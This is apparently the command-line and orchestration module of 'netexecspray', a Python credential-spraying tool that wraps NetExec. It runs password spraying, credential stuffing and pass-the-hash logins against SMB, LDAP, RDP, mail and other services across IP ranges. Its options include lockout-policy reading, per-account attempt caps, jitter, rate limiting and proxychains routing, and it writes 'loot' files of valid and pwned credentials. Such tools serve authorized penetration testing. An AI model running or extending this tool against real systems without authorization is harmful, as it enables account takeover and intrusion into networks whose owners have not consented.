"""Command-line interface and run orchestration."""

import argparse
import json
import signal
import sys
import threading
import time
from concurrent.futures import ThreadPoolExecutor, as_completed
from datetime import datetime
from pathlib import Path

from . import __version__
from . import state
from . import theme
from . import ui
from .loaders import (expand_targets, load_combos, load_list, load_prior_attempts,
                      load_spray_file)
from .protocols import (ALL_PROTOCOLS, BUNDLES, NATIVE_PROTOCOLS, NXC_PROTOCOLS,
                        PORTS, SERVICES, expand_bundles)
from .results import (build_json, log_header, log_summary, write_csv, write_loot, write_report)
from .runners import read_lockout_policy
from .theme import (BOLD, CYAN, GRAY, G_INFO, G_RND, G_SECT, G_SKIP, G_WARN,
                    RESET, YELLOW, gradient_text, rule)
from .worker import preflight_checks, spray_one


# A relevant usage example per option — shown when the parser errors, so a
# mistake like `netexecspray -S` prints exactly how to use that flag.
_EXAMPLES = [
    (("-S", "--spray-file"),
     "netexecspray smb 10.10.10.1 -S creds.txt"
     "   # one file: 'user:pass' and bare 'user' lines -> all users x all passwords"),
    (("-c", "--combo", "--creds"),
     "netexecspray smb 10.10.10.1 -c creds.txt"
     "   # 'user:pass' per line (paired): each user tries only its own password"),
    (("-H", "--hash"),
     "netexecspray smb dc01.corp.local -u admin -H :32ed87bdb5fdc5e9cba88547376818d4"),
    (("-U", "--userfile"),
     "netexecspray ad 10.10.10.0/24 -U users.txt -p 'Winter2025!' --safe"),
    (("--resume",),
     "netexecspray ad targets.txt -u users.txt -p p.txt --resume spray_prev.log"),
    (("--report", "--out-dir", "--json", "--output"),
     "netexecspray ad dc.corp -u u.txt -p p.txt --out-dir loot/ --report engagement.md"),
]
_EXAMPLE_DEFAULT = "netexecspray smb 10.10.10.1 -u users.txt -p 'Password1'"


def _example_for(argv):
    """Pick the most relevant usage example for the flags present in argv."""
    toks = set(argv)
    for flags, ex in _EXAMPLES:
        if toks.intersection(flags):
            return ex
    return _EXAMPLE_DEFAULT


class _HelpfulParser(argparse.ArgumentParser):
    """Like ArgumentParser, but every error ends with a usable example."""
    def error(self, message):
        self.print_usage(sys.stderr)
        sys.stderr.write(f"\n{self.prog}: error: {message}\n")
        sys.stderr.write(f"\nexample:\n  {_example_for(sys.argv[1:])}\n"
                         f"\nsee '{self.prog} --help' for all options, "
                         f"or '--list-protocols' for protocols.\n")
        self.exit(2)


class _ListProtocols(argparse.Action):
    """`--list-protocols`: print the protocol/port/service catalogue and exit."""
    def __init__(self, option_strings, dest, **kw):
        super().__init__(option_strings, dest, nargs=0, **kw)

    def __call__(self, parser, ns, values, option_string=None):
        if "--no-color" in sys.argv or not sys.stdout.isatty():
            theme.set_no_color()
        _print_protocol_catalogue()
        parser.exit()


def _print_protocol_catalogue():
    from . import theme as _t
    hdr = _t.gradient_text("netexecspray · protocol coverage")
    ui.cprint("")
    ui.cprint(f"  {hdr}")
    ui.cprint("")

    def section(title, names, native=False):
        ui.cprint(f"  {_t.RED}▎{_t.RESET} {BOLD}{title}{RESET}  "
                  f"{GRAY}({'pure-Python' if native else 'via nxc'}){RESET}")
        for p in names:
            ui.cprint(f"      {CYAN}{p:<7}{RESET} {GRAY}{PORTS.get(p,''):<9}{RESET} "
                      f"{SERVICES.get(p,'')}")
        ui.cprint("")

    section("nxc-backed", NXC_PROTOCOLS)
    section("native", NATIVE_PROTOCOLS, native=True)
    ui.cprint(f"  {_t.RED}▎{_t.RESET} {BOLD}bundles{RESET}")
    for name, members in BUNDLES.items():
        if name == "all":
            continue
        ui.cprint(f"      {CYAN}{name:<7}{RESET} {GRAY}{' '.join(members)}{RESET}")
    ui.cprint(f"      {CYAN}{'all':<7}{RESET} {GRAY}every protocol above{RESET}")
    ui.cprint("")


def build_parser():
    parser = _HelpfulParser(
        prog="netexecspray",
        description="netexecspray — modern multi-protocol NetExec sprayer",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog=f"""
protocols:
  nxc-backed : {', '.join(NXC_PROTOCOLS)}
  native     : {', '.join(NATIVE_PROTOCOLS)}
  bundles    : {', '.join(f'{k}=({",".join(v)})' for k, v in BUNDLES.items() if k != 'all')}
  all        : everything above

examples:
  %(prog)s smb 10.10.10.1 -u admin -p 'Password1'
  %(prog)s smb 10.10.10.1 -u user1,user2 -p pass1,pass2    # inline lists, no files
  %(prog)s ad 10.129.0.0/24 -u users.txt -p 'Winter2025!' --safe
  %(prog)s ad corp.local -u users.txt -p pws.txt --max-attempts 3 --lockout-delay 60
  %(prog)s all dc01.corp.local -u users.txt -H :32ed87bdb5fdc5e9cba88547376818d4
  %(prog)s mail mail.corp.com -u user@corp.com -p 'Pass'
  %(prog)s smb 10.10.10.1 --combo creds.txt           # user:pass stuffing
  %(prog)s smb dc.corp.local -u users.txt -p x --null --guest
  %(prog)s ad targets.txt -u users.txt -p x --resume spray_prev.log --rate 5
  %(prog)s ad dc.corp -u u.txt -p p.txt --out-dir loot/ --report engagement.md

outputs (nothing is written unless you ask for it):
  --output FILE     write a log file (and loot/csv next to it)
  --out-dir DIR     write valid.txt / pwned.txt / results.csv into DIR
  --report FILE.md  Markdown engagement report      --json FILE  JSON summary
        """,
    )

    parser.add_argument("--version", action="version",
                        version=f"netexecspray {__version__}")
    parser.add_argument("--list-protocols", action=_ListProtocols,
                        help="List every protocol, default port, and bundle, then exit")

    parser.add_argument("protocols", metavar="PROTOCOLS",
                        help="Comma-separated protocols, a bundle, or 'all'")
    parser.add_argument("target", metavar="TARGET",
                        help="IP, hostname, domain, CIDR, comma-list, or file of targets")

    cred = parser.add_argument_group("credentials")
    cred.add_argument("-u", "--user", help="Username, comma-list (user1,user2), or file of usernames")
    cred.add_argument("-U", "--userfile", help="File of usernames (alias for -u <file>)")
    cred.add_argument("-p", "--password", help="Password, comma-list (pass1,pass2), or file of passwords")
    cred.add_argument("-H", "--hash", metavar="HASH", help="NTLM hash for pass-the-hash (LM:NT or :NT)")
    cred.add_argument("-c", "--combo", "--creds", metavar="FILE", dest="combo",
                      help="File of user:pass per line (1:1 stuffing) — use instead of -u/-p")
    cred.add_argument("-S", "--spray-file", metavar="FILE", dest="spray_file",
                      help="Mixed file of 'user:pass' and bare 'user' lines → spray "
                           "ALL users × ALL found passwords (pooled, not paired)")

    tgt = parser.add_argument_group("targeting")
    tgt.add_argument("--resolve", action="store_true", help="Resolve domain/hostname to IPs via DNS")
    tgt.add_argument("--local-auth", action="store_true", help="Use local authentication (nxc protocols)")
    tgt.add_argument("--no-expand-cidr", action="store_true",
                     help="Pass CIDRs to nxc as-is instead of expanding to hosts")
    tgt.add_argument("--force", action="store_true", help="Allow very large CIDR expansions (>1024 hosts)")
    tgt.add_argument("--null", action="store_true", help="Pre-flight: probe null/anonymous sessions (smb/ldap/rdp)")
    tgt.add_argument("--guest", action="store_true", help="Pre-flight: probe guest/blank sessions (smb/ldap/rdp)")

    tim = parser.add_argument_group("timing")
    tim.add_argument("--threads", type=int, default=10, metavar="N", help="Concurrent threads (default: 10)")
    tim.add_argument("--timeout", type=int, default=30, metavar="SEC", help="Per-attempt timeout (default: 30)")
    tim.add_argument("--delay", type=float, default=0, metavar="SEC", help="Delay between job submissions")
    tim.add_argument("--lockout-delay", type=float, default=0, metavar="SEC",
                     help="Sleep between password rounds / protocol sections")
    tim.add_argument("--rate", type=float, default=0, metavar="N",
                     help="Global cap of N attempts/second across all threads")
    tim.add_argument("--jitter", metavar="A-B", help="Random per-attempt sleep, seconds (e.g. 0.5-2)")

    safe = parser.add_argument_group("lockout safety")
    safe.add_argument("--max-attempts", type=int, default=0, metavar="N",
                      help="Cap attempts per account across the whole run")
    safe.add_argument("--pass-pol", action="store_true", help="Read domain lockout policy first and auto-pace")
    safe.add_argument("--safe", action="store_true", help="Alias for --pass-pol (read policy and auto-cap)")
    safe.add_argument("--resume", metavar="LOG", help="Skip attempts already present in a previous log")
    safe.add_argument("--proxychains", action="store_true",
                      help="Route nxc through 'proxychains -q' (native protos skipped)")

    out = parser.add_argument_group("output")
    out.add_argument("--validate", action="store_true", help="Secondary check to confirm real access (nxc protocols)")
    out.add_argument("--only-access", action="store_true", help="Only report confirmed-access results")
    out.add_argument("--explain", action="store_true", help="Print failure reason on every missed attempt")
    out.add_argument("-v", "--verbose", action="store_true",
                     help="Show per-attempt errors / skips live (default: hits only)")
    out.add_argument("--quiet", action="store_true", help="Hide everything but credential hits and the summary")
    out.add_argument("--output", metavar="FILE", help="Write a log file here (off by default; enables loot/csv next to it)")
    out.add_argument("--out-dir", metavar="DIR", help="Write loot (valid.txt/pwned.txt/results.csv) into DIR")
    out.add_argument("--report", metavar="FILE.md", help="Write a Markdown engagement report to FILE.md")
    out.add_argument("--json", metavar="FILE", help="Write JSON summary to FILE at exit")
    out.add_argument("--bell", action="store_true", help="Ring the terminal bell on every confirmed access")
    out.add_argument("--no-color", action="store_true")
    return parser


def _resolve_credentials(args, parser):
    """Return (users, secrets, combos, is_hash) from the parsed args."""
    is_hash = bool(args.hash)

    # pooled spray file: one file supplies both users and passwords → users × pws
    if args.spray_file:
        if args.combo or args.user or args.userfile or args.password or args.hash:
            parser.error("--spray-file is standalone; don't combine it with "
                         "-u/-U/-p/-H/--combo")
        users, secrets = load_spray_file(args.spray_file)
        if not users:
            parser.error(f"No users loaded from {args.spray_file}")
        if not secrets:
            parser.error(f"{args.spray_file} has no 'user:pass' line to supply a "
                         "password — add one, or spray with -u FILE -p PASS")
        return users, secrets, [], False

    combos  = load_combos(args.combo) if args.combo else []

    if args.combo:
        if not combos:
            parser.error(f"No user:pass pairs loaded from {args.combo}")
        users = list(dict.fromkeys(u for u, _ in combos))
        return users, [], combos, is_hash

    if not args.user and not args.userfile:
        parser.error("Provide -u USER/FILE, -U USERFILE, or --combo FILE")
    if not args.password and not args.hash:
        parser.error("Provide -p PASSWORD/FILE or -H HASH")
    if args.password and args.hash:
        parser.error("-p and -H are mutually exclusive")

    user_src = args.userfile if (args.userfile and not args.user) else args.user
    users = load_list(user_src)
    if not users:
        parser.error("No users loaded")

    secrets = [args.hash] if is_hash else load_list(args.password)
    if not secrets:
        parser.error("No passwords loaded")
    return users, secrets, combos, is_hash


def _artifact_paths(args, logfile):
    """Where loot / csv land: into --out-dir, else next to --output's log.
    Returns (None, None, None) when neither was requested → write nothing."""
    if args.out_dir:
        od = Path(args.out_dir)
        od.mkdir(parents=True, exist_ok=True)
        return od / "valid.txt", od / "pwned.txt", od / "results.csv"
    if logfile:
        stem = Path(logfile).with_suffix("")
        return (stem.with_name(stem.name + ".valid.txt"),
                stem.with_name(stem.name + ".pwned.txt"),
                stem.with_name(stem.name + ".csv"))
    return None, None, None


def main(argv=None):
    parser = build_parser()
    args = parser.parse_args(argv)

    if args.no_color:
        theme.set_no_color()
    state.bell_enabled = args.bell

    # jitter range A-B → (lo, hi)
    if args.jitter:
        try:
            lo, hi = (float(x) for x in args.jitter.split("-", 1))
            args.jitter = (min(lo, hi), max(lo, hi))
        except ValueError:
            parser.error("--jitter must look like A-B  (e.g. 0.5-2)")
    else:
        args.jitter = None

    users, secrets, combos, is_hash = _resolve_credentials(args, parser)

    requested = [p.strip().lower() for p in args.protocols.split(",") if p.strip()]
    protocols, unknown = expand_bundles(requested)
    if unknown:
        parser.error(f"Unknown protocol(s): {', '.join(unknown)}\n"
                     f"  nxc-backed : {', '.join(NXC_PROTOCOLS)}\n"
                     f"  native     : {', '.join(NATIVE_PROTOCOLS)}\n"
                     f"  bundles    : {', '.join(BUNDLES)}")

    raw_targets = load_list(args.target)
    if not raw_targets:
        parser.error("No targets loaded")
    targets = expand_targets(raw_targets, resolve=args.resolve,
                             expand_cidr=not args.no_expand_cidr, force=args.force)

    # No files are written unless asked for: --output enables the log file,
    # --out-dir / --report / --json each enable their own artifact.
    logfile = args.output

    # job total: combo mode drives its own pairs; otherwise users × passwords
    n_pairs = len(combos) if args.combo else len(users) * len(secrets)
    total   = len(protocols) * len(targets) * n_pairs
    with state.counter_lock:
        state.counter["total"] = total

    if args.combo:
        secret_kind = f"{len(combos)} combos"
    elif is_hash:
        secret_kind = "hash"
    else:
        secret_kind = f"{len(secrets)} passwords" if len(secrets) > 1 else "password"
    tgt_str = ", ".join(targets[:2]) + (f" +{len(targets) - 2}" if len(targets) > 2 else "")

    started = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    cmd     = " ".join([Path(sys.argv[0]).name] + sys.argv[1:])

    # resume: pre-seed already-tried attempts and locked users
    if args.resume:
        seen, locked = load_prior_attempts(args.resume)
        with state.seen_lock:
            state.seen.update(seen)
        with state.locked_lock:
            state.locked_users.update(locked)
        ui.cprint(f"  {CYAN}{G_INFO} resume: skipping {len(seen)} prior attempts, "
                  f"{len(locked)} locked users{RESET}")

    # lockout policy: read it and auto-cap attempts per account
    if args.pass_pol or args.safe:
        pu  = users[0]
        ps  = combos[0][1] if args.combo else (args.hash if is_hash else secrets[0])
        pol = read_lockout_policy(targets[0], pu, ps, is_hash, args.timeout)
        if pol and pol["threshold"]:
            if not args.max_attempts:
                args.max_attempts = max(pol["threshold"] - 1, 1)
            ui.cprint(f"  {CYAN}{G_INFO} lockout policy: threshold {pol['threshold']}, "
                      f"reset {pol['window']} → cap {args.max_attempts}/account{RESET}")
        elif pol:
            ui.cprint(f"  {CYAN}{G_INFO} lockout policy: no threshold (lockout disabled){RESET}")
        else:
            ui.cprint(f"  {YELLOW}{G_WARN} could not read lockout policy — no auto-cap{RESET}")

    log_header(logfile, started, protocols, targets, users, secret_kind, total, cmd)
    _print_banner(args, total, targets, users, secret_kind, tgt_str, protocols, logfile)

    _run_spray(args, protocols, targets, users, secrets, combos, is_hash, logfile)

    _finish(args, started, cmd, protocols, targets, users, secret_kind, logfile)


# ── Banner ───────────────────────────────────────────────────────────────────
def _print_banner(args, total, targets, users, secret_kind, tgt_str, protocols, logfile):
    dot = f" {GRAY}·{RESET} "
    nt, nu = len(targets), len(users)
    proto_desc = f"{len(protocols)} protocols" if len(protocols) > 6 else " ".join(protocols)

    stats = dot.join([
        f"{BOLD}{total}{RESET} {GRAY}job{'' if total == 1 else 's'}{RESET}",
        f"{BOLD}{nt}{RESET} {GRAY}target{'' if nt == 1 else 's'}{RESET}",
        f"{BOLD}{nu}{RESET} {GRAY}user{'' if nu == 1 else 's'}{RESET}",
        f"{GRAY}{secret_kind}{RESET}",
        f"{BOLD}{args.threads}{RESET}{GRAY}t{RESET}",
    ])
    flags = []
    if args.validate:     flags.append("validate")
    if args.max_attempts: flags.append(f"max{args.max_attempts}")
    if args.rate:         flags.append(f"{args.rate:g}/s")
    if args.proxychains:  flags.append("proxy")
    if flags:
        stats += dot + GRAY + " ".join(flags) + RESET

    ui.set_title("netexecspray · starting")
    ui.banner(__version__)
    ui.cprint("")
    ui.cprint(f"  {stats}")
    ui.cprint(f"  {GRAY}{tgt_str}  ·  {proto_desc}{RESET}")
    ui.cprint("")


# ── Spray loop ────────────────────────────────────────────────────────────────
def _submit(pool, protos, pairs, targets, args, is_hash, logfile):
    """Queue every proto × (user,secret) × target job onto the pool at once, so
    up to --threads attempts run concurrently. Returns {future: (user, target)}."""
    futures = {}
    for proto in protos:
        for user, secret in pairs:
            with state.locked_lock:
                if user in state.locked_users:          # skip accounts already locked
                    with state.counter_lock:
                        state.counter["total"] -= len(targets)
                    continue
            for target in targets:
                if state.abort.is_set():
                    return futures
                fut = pool.submit(spray_one, proto, target, user, secret, is_hash, logfile, args)
                futures[fut] = (user, target)
                if args.delay > 0:
                    time.sleep(args.delay)
    return futures


def _drain(futures):
    for fut in as_completed(futures):
        try:
            fut.result()
        except Exception as e:
            user, target = futures[fut]
            ui.cprint(f"  {GRAY}thread {user}@{target}: {e}{RESET}")


def _run_spray(args, protocols, targets, users, secrets, combos, is_hash, logfile):
    state.start_time = time.time()

    def _sigint(signum, frame):
        if not state.abort.is_set():
            state.abort.set()
            ui.cprint(f"\n  {YELLOW}{G_WARN} interrupt — draining in-flight attempts, "
                      f"writing partial results…{RESET}")
    signal.signal(signal.SIGINT, _sigint)

    ticker = None
    if state.is_tty:
        ticker = threading.Thread(target=ui.ticker, daemon=True)
        ticker.start()

    # one wave per password round, or a single wave for combo mode
    if args.combo:
        waves = [("combo", None, combos)]
    else:
        waves = [(f"round {i + 1}/{len(secrets)}", s, [(u, s) for u in users])
                 for i, s in enumerate(secrets)]

    preflight_checks(protocols, targets, args, logfile)
    paced = args.lockout_delay > 0   # opt-in: one protocol section at a time

    with ThreadPoolExecutor(max_workers=args.threads) as pool:
        for wi, (wlabel, wsecret, pairs) in enumerate(waves):
            if state.abort.is_set():
                break
            if len(waves) > 1 or args.combo:
                tail = f"  {wsecret}" if wsecret else f"  {len(pairs)} pairs"
                ui.cprint(f"\n{gradient_text(f'{G_RND} {wlabel}')}{GRAY}{tail}{RESET}")

            if paced:
                # pace between protocol sections (keeps attempts/account spread out)
                for proto in protocols:
                    if state.abort.is_set():
                        break
                    state.phase = f"{wlabel} · {proto}" if len(waves) > 1 else proto
                    _drain(_submit(pool, [proto], pairs, targets, args, is_hash, logfile))
                    if proto != protocols[-1] and not state.abort.is_set():
                        ui.cprint(f"  {GRAY}… lockout delay {args.lockout_delay}s{RESET}")
                        time.sleep(args.lockout_delay)
            else:
                # fast path: submit the whole wave at once so all threads stay busy
                state.phase = wlabel if len(waves) > 1 else ""
                _drain(_submit(pool, protocols, pairs, targets, args, is_hash, logfile))

            if (len(waves) > 1 and wi < len(waves) - 1
                    and args.lockout_delay > 0 and not state.abort.is_set()):
                ui.cprint(f"  {GRAY}… round delay {args.lockout_delay}s{RESET}")
                time.sleep(args.lockout_delay)

    state.phase = ""
    state.stop_ticker.set()
    if ticker:
        ticker.join(timeout=0.5)
    if state.is_tty:
        with state.print_lock:
            sys.stdout.write("\r\033[K")
            sys.stdout.flush()


# ── Summary + artifacts ───────────────────────────────────────────────────────
def _finish(args, started, cmd, protocols, targets, users, secret_kind, logfile):
    aborted = state.abort.is_set()
    with state.counter_lock:
        done_n = state.counter["done"]
    elapsed  = time.time() - state.start_time
    rate     = done_n / elapsed if elapsed > 0 else 0
    finished = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    dot      = f" {GRAY}·{RESET} "

    meta = {"started": started, "finished": finished, "cmd": cmd,
            "protocols": protocols, "targets": targets,
            "users": len(users), "secret_kind": secret_kind}

    ui.print_results_table(aborted, done_n, elapsed, rate, dot)

    with state.results_lock:
        valid_p, pwned_p, csv_p = _artifact_paths(args, logfile)
        if valid_p:
            write_loot(valid_p, pwned_p, state.results)
            write_csv(csv_p, state.attempts)
        log_summary(logfile, state.results, state.attempts, done_n, elapsed, rate, finished, aborted)
        if args.report:
            write_report(args.report, meta, state.results, state.attempts, elapsed, aborted)
        if args.json:
            Path(args.json).write_text(
                json.dumps(build_json(meta, state.results, state.attempts, aborted), indent=2))

    # Only mention files that were actually written.
    outs = []
    if logfile:     outs.append(("log", logfile))
    if valid_p:     outs += [("loot", valid_p), ("csv", csv_p)]
    if args.report: outs.append(("report", args.report))
    if args.json:   outs.append(("json", args.json))
    if outs:
        ui.cprint("")
        for label, path in outs:
            ui.cprint(f"  {GRAY}{G_INFO} {label:<6}→ {ui.file_link(path)}{RESET}")
    ui.cprint("")

    n_hits = len(state.results["access"]) + len(state.results["valid"])
    ui.set_title(f"netexecspray · done · {n_hits} hit{'' if n_hits == 1 else 's'}")


if __name__ == "__main__":
    main()
